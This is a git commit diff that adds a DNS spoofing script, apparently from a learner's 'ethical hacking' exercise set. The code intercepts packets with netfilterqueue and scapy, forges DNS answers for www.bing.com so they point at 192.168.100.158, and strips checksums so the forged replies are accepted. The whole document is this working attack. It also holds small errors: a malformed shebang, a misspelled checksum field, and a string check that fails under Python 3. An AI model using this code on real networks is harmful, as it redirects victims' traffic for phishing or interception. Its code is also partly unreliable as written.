44bed5dc01429d34e9bdff61b7f80a697dae37fc
wambugu-dennis <wambugudennis398@gmail.com>
2022-09-07 03:19:58 +0300

    commit

--- Python and Ethical Hacking scripts/dns_spoof.py
+++ Python and Ethical Hacking scripts/dns_spoof.py
@@ -1,9 +1,26 @@
 #!/usrbin/evn python
 import netfilterqueue
+import scapy.all as scapy
 
 
 def process_packet(packet):
-    print(packet)
+    my_packet = scapy.IP(packet.get_payload())
+    print(my_packet.show())
+    if my_packet.haslayer(scapy.DNSRR):
+        qname = my_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target...")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.158")
+            my_packet[scapy.DNS].an = answer
+            my_packet[scapy.DNS].ancount = 1
+
+            del my_packet[scapy.IP].len
+            del my_packet[scapy.IP].chksm
+            del my_packet[scapy.UDP].chksm
+            del my_packet[scapy.UDP].len
+
+            packet.set_payload(str(my_packet))
+
     packet.accept()
 
 
